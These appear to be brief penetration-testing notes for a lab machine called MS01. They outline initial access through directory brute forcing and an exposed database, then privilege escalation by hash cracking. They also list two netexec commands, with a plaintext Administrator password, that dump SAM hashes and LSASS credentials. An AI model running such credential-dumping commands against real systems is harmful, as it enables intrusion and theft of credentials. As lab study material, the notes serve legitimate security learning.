## MS01

**Initial foothold:**
1) Webserver brute force dir => DB exposed with "support" user creds 

**PrivEsc:**
1) PrivEsc via binary hash cracking


## Notes:

Mimikatz alternative:
   `netexec smb ms01 -u Administrator -p 'December31' --local-auth --sam` and
   `netexec smb ms01 -u Administrator -p 'December31' --local-auth -M lsassy`